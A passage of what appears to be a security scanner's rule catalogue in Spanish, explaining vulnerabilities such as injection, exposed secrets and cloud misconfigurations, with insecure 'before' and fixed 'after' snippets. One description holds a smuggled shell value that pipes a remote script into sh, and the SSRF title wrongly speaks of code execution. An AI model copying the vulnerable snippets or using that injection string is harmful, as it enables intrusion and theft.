      "Una variable con prefijo público (p. ej. NEXT_PUBLIC_, VITE_) o un archivo del lado del cliente hace referencia a la service role key de Supabase. Esta clave evita la Row Level Security: si termina en el bundle del navegador, cualquiera puede leerla y actuar como administrador de la base de datos.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (solo servidor)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Hay contraseñas o claves secretas escritas directamente en el código",
    description:
      "Una clave API, un token o una contraseña parecen escritos como valor literal en vez de leerse de una variable de entorno. Cualquiera que lea el código fuente (o el repositorio, si es público) obtiene ese secreto.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Un archivo con las contraseñas reales del proyecto está entre los analizados",
    description:
      "Un archivo .env con valores reales (no un .env.example) está incluido en el análisis. Si este archivo termina en un repositorio o en un despliegue público, todas las credenciales que contiene quedan expuestas.",
    fix: {
      before: `# .env (subido por error)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (subido)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env se queda fuera del repo (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Cualquiera puede leer o modificar los datos de todos los usuarios",
    description:
      "La Row Level Security está desactivada, o una policy permite el acceso a cualquiera (USING (true)) sin comprobar quién hace la solicitud. Cualquier usuario autenticado — o incluso anónimo — puede leer o modificar los datos de todos los demás.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Un valor introducido por el usuario se pega directamente en una consulta a la base de datos",
    description:
      "Una consulta SQL se construye concatenando o interpolando directamente una cadena en vez de usar parámetros. Si ese texto llega (aunque sea indirectamente) de un usuario, puede alterar la propia consulta — inyección SQL.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Las contraseñas no parecen estar protegidas",
    description:
      "Un campo de contraseña se guarda tal cual llegó en la solicitud, y en el archivo no aparece ninguna función de hashing (bcrypt, argon2, scrypt). Si la base de datos se ve comprometida, todas las contraseñas son utilizables de inmediato.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "El secreto usado para firmar los accesos está escrito en claro en el código",
    description:
      "El secreto que se pasa a jwt.sign / jwt.verify (o la variable JWT_SECRET) es un valor literal en el código en vez de venir de una variable de entorno. Cualquiera que lo lea puede crear tokens de acceso válidos para cualquier usuario.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "El servidor puede ser obligado a ejecutar comandos externos",
    description:
      "Una función que ejecuta comandos del sistema (exec, execSync, spawn) recibe una cadena construida por interpolación o concatenación. Si una parte de esa cadena llega de la entrada del usuario, quien la controla puede hacer que se ejecuten comandos arbitrarios en el servidor.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "Se puede leer o escribir un archivo del servidor eligiendo la ruta desde fuera",
    description:
      "Una función que lee, escribe o envía un archivo obtiene la ruta directamente de un valor de la solicitud (query, body, params) sin comprobar que se mantenga dentro de una carpeta permitida. Un atacante puede insertar \"../\" para salir de la carpeta prevista y leer o sobrescribir archivos arbitrarios del servidor (p. ej. un archivo de configuración con credenciales).",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Ruta no permitida")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Un valor introducido por el usuario se ejecuta como código dentro de una consulta de MongoDB",
    description:
      "El operador $where de MongoDB ejecuta JavaScript del lado del servidor para cada documento — si esa cadena se construye concatenando un valor que llega del usuario, quien lo controla puede hacer que se ejecute código arbitrario en el contexto de la base de datos, no solo alterar el filtro como con una inyección SQL normal.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Un valor introducido por el usuario se interpreta como una plantilla, no como un dato",
    description:
      "Una función que compila/ejecuta una plantilla recibe la plantilla ENTERA de un valor de la solicitud, en vez de usar una plantilla fija y pasar solo los datos. Un atacante puede escribir directamente en la sintaxis del motor de plantillas (p. ej. {{7*7}} para Jinja2) y ejecutar código en el servidor — Server-Side Template Injection, que a menudo lleva a ejecución de comandos arbitrarios, no solo a un problema de visualización como el XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "El parser XML puede ser obligado a leer archivos o hacer solicitudes externas",
    description:
      "Un parser XML (DocumentBuilderFactory) se crea sin desactivar explícitamente las entidades externas (DOCTYPE) en las líneas cercanas. Si el parser recibe XML de una fuente no confiable, un atacante puede definir una entidad externa para leer archivos del servidor o hacer que contacte una dirección de su elección — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Un secreto está escrito directamente en una instrucción ENV o ARG del Dockerfile",
    description:
      "Una variable con un nombre tipo password/secret/token/key tiene un valor literal en una instrucción ENV o ARG. A diferencia de un .env (que normalmente no termina en la imagen), este valor queda incorporado en la propia imagen Docker — cualquiera que pueda hacer pull o inspeccionar el historial de capas lo recupera, aunque la línea se elimine en una versión posterior del Dockerfile.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# pasado con: docker build --build-arg DB_PASSWORD=*** (o, mejor aún,\n# con un secret mount de BuildKit, que nunca termina en el historial de capas)`,
    },
  },
  "k8s-privileged-container": {
    title: "Un contenedor del manifiesto de Kubernetes se ejecuta como privileged",
    description:
      '"privileged: true" en el securityContext de un contenedor desactiva casi todo el aislamiento habitual entre contenedor y host: el contenedor puede acceder a los dispositivos del host, cambiar su configuración de red y, en muchos casos, obtener de hecho acceso root en la máquina que lo ejecuta. Casi nunca es necesario para una app normal.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # solo las capabilities realmente necesarias`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Un secreto está escrito en claro en una variable env del manifiesto de Kubernetes",
    description:
      'Una variable de entorno con un nombre tipo password/secret/token/key tiene un valor literal ("value:") en vez de leerse de un Secret ("valueFrom.secretKeyRef"). El manifiesto en sí — a menudo subido a un repositorio — contiene entonces el secreto en claro, visible incluso para quien solo puede leer la configuración, no necesariamente ejecutar comandos en el clúster.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "Un security group de Terraform abre un puerto sensible a todo internet",
    description:
      'Una regla con "cidr_blocks" que incluye 0.0.0.0/0 (cualquier dirección IP) está cerca de un puerto sensible — SSH (22), RDP (3389), o un puerto típico de base de datos (MySQL, Postgres, MongoDB, Redis, SQL Server). Cualquiera en internet puede intentar conectarse a ese servicio, no solo quien debería.',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # solo tu red privada, o un bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Una regla de firewall de Google Cloud abre un puerto sensible a todo internet",
    description:
      'Un recurso "google_compute_firewall" con "source_ranges" que incluye 0.0.0.0/0 (cualquier dirección IP) permite tráfico hacia un puerto sensible — SSH (22), RDP (3389), o un puerto típico de base de datos (MySQL, Postgres, MongoDB, Redis, SQL Server). Cualquiera en internet puede intentar conectarse a ese servicio, no solo quien debería.',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # solo tu red privada, o un bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Una regla de red de Azure abre un puerto sensible a todo internet",
    description:
      'Una regla de seguridad de red ("azurerm_network_security_rule", o un bloque "security_rule" dentro de "azurerm_network_security_group") con "source_address_prefix" en "*" o "0.0.0.0/0", dirección "Inbound" y acceso "Allow", cerca de un puerto sensible — SSH (22), RDP (3389), o un puerto típico de base de datos. Cualquiera en internet puede intentar conectarse a ese servicio, no solo quien debería.',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # solo tu red privada, o un bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Un secreto está escrito como valor por defecto de una variable de Terraform",
    description:
      'Una variable con un nombre tipo password/secret/token/key tiene un valor literal en su "default". A diferencia de un valor pasado en tiempo de ejecución (tfvars, variables de entorno TF_VAR_*), un default termina en el código fuente — y si el repositorio es compartido o público, cualquiera lo ve, incluso sin acceso al estado de Terraform.',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # sin default: debe pasarse con un archivo .tfvars (fuera de git) o una variable de entorno TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Un valor controlado por un usuario externo entra directamente en un comando de shell de la CI",
    description:
      'Un comando "run:" de un workflow de GitHub Actions interpola directamente un valor como el título de una pull request, el nombre de una rama o el texto de un comentario — todos escribibles por cualquiera que abra una pull request o un comentario, incluso desde un fork externo. Un valor como `"; curl malware.sh | sh #` ejecutaría comandos arbitrarios en la CI, con acceso a todos los secretos disponibles en ese workflow.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # pasado como variable de entorno, nunca interpolado directamente en el comando`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "El workflow ejecuta el código de una pull request externa con acceso a los secretos del repositorio",
    description:
      'El workflow usa "pull_request_target" — que se ejecuta con los permisos y los secretos del repositorio base incluso para una pull request abierta desde un fork ajeno — y hace el checkout del propio código de la pull request ("github.event.pull_request.head"), no de la rama base. Quien abre la pull request consigue de hecho que su propio código se ejecute con acceso a esos secretos.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Hace el checkout de la rama base, no del código de la PR — o bien usa\n      # "pull_request" en vez de "pull_request_target" si no necesitas\n      # los permisos/secretos más amplios.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Los datos de la solicitud se deserializan con un formato que puede ejecutar código",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) o la librería node-serialize (Node) están deserializando un valor tomado directamente de la solicitud. A diferencia de JSON, estos formatos pueden representar y ejecutar código durante la propia deserialización — quien controla el valor enviado puede lograr ejecución de código arbitrario en el servidor.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON nunca ejecuta código al analizar, a diferencia de pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'El código acepta explícitamente tokens JWT sin firmar (algoritmo "none")',
    description:
      '"none" aparece entre los algoritmos aceptados para verificar un token JWT. Un token con el algoritmo "none" no tiene ninguna firma que verificar: cualquiera puede construir uno con cualquier contenido (p. ej. un rol de administrador) y el código lo aceptaría como válido.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // nunca incluir "none" entre los algoritmos aceptados`,
    },
  },
  "unprotected-new-table": {
    title: "Parece que se ha creado una tabla nueva sin protección",
    description:
      "Una migración SQL crea una tabla pero no activa la Row Level Security para esa misma tabla en el mismo archivo. Mientras siga así, la tabla nace sin ninguna restricción sobre quién puede leerla o escribirla.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "El sitio acepta solicitudes de cualquier otro sitio web",
    description:
      "La cabecera CORS está configurada para aceptar solicitudes de cualquier origen (*), o el middleware cors() se usa sin restricciones. Cualquier sitio web de terceros puede llamar a tus API desde el navegador de un usuario ya autenticado.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://tusitio.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Una función con permisos de administrador no comprueba quién la usa",
    description:
      "Una ruta o función cuyo nombre sugiere operaciones de administrador no contiene, en las líneas cercanas, ningún control de autenticación o de rol. Cualquiera que conozca la URL podría ejecutarla.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "El sitio puede ser obligado a ejecutar código externo",
    description:
      "Una solicitud HTTP saliente (fetch, axios) usa directamente un valor que llega de la solicitud de un usuario como URL de destino. Un usuario malintencionado puede hacer que tu servidor llame a direcciones internas o arbitrarias — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.tuservicio.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL no permitida")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Las contraseñas están protegidas con un método que ya es fácil de romper",
    description:
      "En la misma línea, se aplican md5() o sha1() a un valor ligado a una contraseña. Estos algoritmos son demasiado rápidos de calcular: un atacante con la base de datos puede probar miles de millones de contraseñas por segundo.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "k8s-run-as-root": {
    title: "Un contenedor del manifiesto de Kubernetes está configurado para ejecutarse como root",
    description:
      '"runAsUser: 0" o "runAsNonRoot: false" en el securityContext fuerzan explícitamente la ejecución como root dentro del contenedor. Si un atacante logra ejecutar código en el contenedor (p. ej. explotando una librería vulnerable), ser root dentro del contenedor facilita una posible fuga hacia el host o un impacto más amplio.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Un contenedor del manifiesto de Kubernetes puede obtener más privilegios de los iniciales",
    description:
      '"allowPrivilegeEscalation: true" en el securityContext permite que un proceso dentro del contenedor obtenga más privilegios que el proceso que lo inició (p. ej. mediante un binario con setuid). Combinado con una vulnerabilidad en la aplicación, es un paso más hacia la ejecución de código con más privilegios de los previstos.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Un pod del manifiesto de Kubernetes comparte la red, los procesos o la memoria compartida del host",
    description:
      '"hostNetwork", "hostPID" o "hostIPC" puestos a true sacan al pod de su aislamiento normal: hostNetwork expone el pod en la red del host (evitando las políticas de red del clúster), hostPID le da visibilidad sobre todos los procesos de la máquina host, hostIPC le da acceso a la memoria compartida del host. Casi nunca es necesario para una app normal — típico solo de herramientas de sistema/monitorización de bajo nivel.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access está desactivado en un bucket S3 definido en Terraform",
    description:
      'Una o más de las cuatro protecciones de "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) están puestas en false. No significa que el bucket ya sea público, pero quita una red de seguridad que impediría hacerlo público por error en el futuro.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Una policy de IAM definida en Terraform concede acceso completo",
    description:
      'Un statement con acción "*" y recurso "*" concede acceso completo a todos los servicios y recursos de AWS — el mismo control que ya se hace sobre el estado IAM en vivo, aquí leído directamente del código antes incluso de aplicarse. Puede ser intencional para un rol de emergencia, pero debe confirmarse: para el uso cotidiano, concede solo los permisos realmente necesarios.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::tu-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Un bucket de Google Cloud Storage queda legible por cualquiera",
    description:
      'Un recurso "google_storage_bucket_iam_member" o "google_storage_bucket_iam_binding" concede un rol a "allUsers" o "allAuthenticatedUsers" — el primero hace el bucket legible por cualquiera en internet, incluso sin cuenta de Google; el segundo por cualquiera que tenga cualquier cuenta de Google, no solo quien debería tener acceso.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:alguien@example.com"  # solo quien de verdad deba tener acceso, no allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "El acceso público a los blobs está habilitado en una cuenta de almacenamiento de Azure",
    description:
      '"allow_blob_public_access" está puesto en true en una "azurerm_storage_account": cualquiera que conozca la URL de un blob/contenedor hecho público puede leerlo, sin ninguna autenticación.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Un rol de IAM de Google Cloud concede acceso completo (Owner/Editor)",
    description:
      'Un "google_project_iam_binding"/"google_project_iam_member" (o el equivalente a nivel de organización/carpeta) asigna el rol primitivo "roles/owner" o "roles/editor" — acceso casi completo a todos los servicios del proyecto. Puede ser intencional para una cuenta de emergencia, pero debe confirmarse: para el uso cotidiano, concede solo los roles predefinidos más específicos que de verdad se necesiten.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # solo el rol predefinido que de verdad se necesita, no roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Una asignación de rol de Azure concede acceso completo (Owner)",
    description:
      'Un "azurerm_role_assignment" asigna el rol "Owner" — acceso completo, incluyendo el control sobre los permisos de otros usuarios, en todo el scope asignado (suscripción, grupo de recursos...). Puede ser intencional para una cuenta de emergencia, pero debe confirmarse: para el uso cotidiano, concede solo el rol más específico que de verdad se necesite (p. ej. "Contributor" en un único grupo de recursos).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # solo el rol más específico que de verdad se necesita, no Owner en toda la suscripción\n}`,
    },
  },
  "weak-random-token": {
    title: "Un token de seguridad se genera con un generador de números aleatorios no criptográficamente seguro",
    description:
      "Un valor con un nombre tipo token/session/reset/otp/csrf se genera con Math.random() (JS), random.random() (Python) o rand() (PHP) — generadores no pensados para la seguridad, cuyas secuencias son predecibles. Un token generado así puede adivinarse o reconstruirse, anulando el propósito para el que existe (p. ej. un enlace de restablecimiento de contraseña que cualquiera podría predecir).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, no Math.random — impredecible`,
    },
  },
  "ldap-injection": {
    title: "Un filtro LDAP se construye concatenando directamente un valor de la solicitud",
    description:
      'Una línea que construye un filtro LDAP (p. ej. "(uid=...)") incluye directamente un valor tomado de la solicitud, sin ningún escape de los caracteres especiales de LDAP. Quien controla ese valor puede alterar la lógica del filtro — por ejemplo, evitar un control de autenticación o leer datos del directorio que no debería ver.',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after:
        "const filter = `(uid=${ldapEscape(req.body.username)})`; // los caracteres especiales de LDAP siempre deben escaparse antes de usarlos en un filtro\nclient.search(base, { filter });",
    },
  },
  "xss-dangerous-html": {
    title: "Un texto escrito por los usuarios podría ejecutar código en el navegador",
    description:
      "Se inserta contenido en la página como HTML en bruto (dangerouslySetInnerHTML, v-html, .innerHTML) en vez de como texto plano. Si ese contenido incluye entrada de un usuario, puede contener scripts que se ejecuten en el navegador de quien lea la página.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// o, si se necesita HTML: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "El espacio de los archivos subidos es visible para cualquiera",
    description:
      "Un bucket de almacenamiento (Supabase Storage, S3) está configurado como público. Si contiene documentos, fotos o archivos subidos por los usuarios, cualquiera que conozca — o adivine — la ruta puede acceder a ellos sin autenticación.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// servir los archivos con URLs firmadas y de duración limitada: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Basta un enlace para borrar o cambiar datos",
    description:
      "Una ruta GET realiza una operación que cambia datos (la ruta contiene delete/remove/update/edit). Las solicitudes GET se ejecutan con solo visitar un enlace o cargar una imagen desde un sitio externo — el punto de apoyo clásico para un ataque CSRF.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Los datos de acceso guardados en el navegador no están bien protegidos",
    description:
      "Un token de acceso se guarda en localStorage. A diferencia de una cookie httpOnly, cualquier script que se ejecute en la página (incluido uno malicioso inyectado vía XSS) puede leerlo y robarlo.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// establecer el token como cookie httpOnly desde el servidor:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "El sitio puede usarse para redirigir a un sitio fraudulento",
    description:
      "El sitio redirige al usuario a una dirección tomada directamente de la solicitud (query, body, params) sin comprobar que sea un dominio conocido. Un enlace que parece apuntar a tu sitio puede en realidad llevar a una página de phishing.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Cambiar un número en la dirección podría mostrar datos de otra persona",
    description:
      "Una consulta a la base de datos usa directamente un identificador tomado de la URL (req.params.id) sin comprobar, en las líneas cercanas, que pertenezca al usuario que hace la solicitud. Cambiar el id en la dirección podría dar acceso a los datos de otro usuario — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "header-injection": {
    title: "Un valor de la solicitud termina directamente en una cabecera HTTP de respuesta",
    description:
      "Una cabecera HTTP de respuesta se establece con un valor tomado directamente de la solicitud (query, body, params), sin comprobar que no contenga un salto de línea (CRLF). Un atacante puede insertar cabeceras adicionales o incluso una respuesta completamente distinta — response splitting — pudiendo manipular la caché, las cookies o el contenido mostrado a otros usuarios.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "El Dockerfile no establece un usuario no root",
    description:
      "No hay instrucción USER en el Dockerfile: sin especificarla, el contenedor se ejecuta como root. Si un atacante logra ejecutar código dentro del contenedor (p. ej. explotando una librería vulnerable), ser root dentro del contenedor facilita una posible fuga hacia el host o un impacto más amplio sobre el sistema circundante.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "El manifiesto de Kubernetes no impone explícitamente la ejecución como usuario no root",
    description:
      'No hay "runAsNonRoot" en ningún sitio del manifiesto (ni a nivel de pod ni de contenedor): sin establecerlo, un contenedor se ejecuta como el usuario que defina su imagen — a menudo root por defecto, si la propia imagen no lo ha cambiado. Establecerlo explícitamente en true hace que el pod falle al iniciar si la imagen igualmente intenta ejecutarse como root, en vez de descubrirlo solo después de un incidente.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "Una acción de terceros en la CI no está fijada a una versión precisa (commit SHA)",
    description:
      'El workflow usa una acción de terceros referenciada por tag o rama (p. ej. "@v1", "@main") en vez de por commit SHA. Quien la mantiene — o quien compromete su cuenta — puede mover esa referencia a un commit distinto en cualquier momento, cambiando silenciosamente lo que se ejecuta en la CI, con acceso a sus secretos. Un commit SHA siempre apunta exactamente al mismo código.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, fijada al commit SHA — actualiza el SHA cuando actualices la versión`,
    },
  },
  "gha-excessive-permissions": {
    title: "El workflow se concede todos los permisos del token en vez de solo los que usa",
    description:
      '"permissions: write-all" concede al GITHUB_TOKEN del workflow acceso de escritura a todo — issues, pull requests, paquetes, despliegues — aunque el workflow solo use una parte. Si un paso del workflow se ve comprometido (una dependencia maliciosa, un script inyectado), esos permisos más amplios aumentan lo que puede hacer quien lo explota.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # solo los permisos que el workflow realmente usa`,
    },
  },
  "insecure-cookie-flags": {
    title: "Una cookie de sesión o autenticación se establece sin los flags Secure y HttpOnly",
    description:
      'Una cookie con un nombre parecido a sesión/autenticación/token se establece sin "httpOnly" y "secure" entre sus opciones. Sin httpOnly, el JavaScript de la página — incluido código inyectado vía XSS — puede leer esa cookie. Sin secure, también puede enviarse por una conexión HTTP sin cifrar.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "no-login-rate-limit": {
    title: "El formulario de acceso no bloquea demasiados intentos seguidos",
    description:
      "Una ruta de login está definida en el archivo, pero no hay rastro de un middleware de rate limiting en ese mismo archivo. Sin un límite de intentos, un atacante puede probar contraseñas en secuencia (fuerza bruta) sin que nada lo frene.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
